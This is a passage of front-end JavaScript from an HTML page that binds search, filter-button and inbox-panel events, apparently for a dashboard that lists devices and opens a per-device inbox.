        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // 11. EVENT BINDINGS
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        document.addEventListener('DOMContentLoaded', () => {
            // Load data
            loadAllSources();

            // Search
            document.getElementById('searchInput').addEventListener('input', (e) => {
                searchQuery = e.target.value;
                applyFiltersAndRender();
            });

            // Filter buttons
            document.querySelectorAll('.filter-group button').forEach(btn => {
                btn.addEventListener('click', () => {
                    document.querySelectorAll('.filter-group button').forEach(b => b.classList.remove(
                    'active'));
                    btn.classList.add('active');
                    filterMode = btn.dataset.filter;
                    applyFiltersAndRender();
                });
            });

            // Close inbox
            document.getElementById('closeInboxBtn').addEventListener('click', closeInbox);

            // FAB: open/close inbox
            document.getElementById('fabBtn').addEventListener('click', () => {
                const panel = document.getElementById('inboxPanel');
                if (panel.classList.contains('open')) {
                    closeInbox();
                } else {
                    // If no device selected, pick the first one
                    if (!selectedDeviceId && deviceList.length > 0) {
                        openInbox(deviceList[0].id);
                    } else if (selectedDeviceId) {
                        openInbox(selectedDeviceId);
                    } else {
                        showToast('No devices loaded');
                    }
                }
            });

            // Click outside to close inbox (on backdrop)
            document.addEventListener('click', (e) => {
                const panel = document.getElementById('inboxPanel');
                const fab = document.getElementById('fabBtn');
                if (panel.classList.contains('open')) {
                    const isPanel = panel.contains(e.target);
                    const isFab = fab.contains(e.target);
                    if (!isPanel && !isFab) {
                        closeInbox();
                    }
                }
            });
        });

        // Make functions globally accessible for inline onclick
        window.openInbox = openInbox;
        window.closeInbox = closeInbox;
        window.copyPhone = copyPhone;
        window.showToast = showToast;
    </script>

</body>
</html>
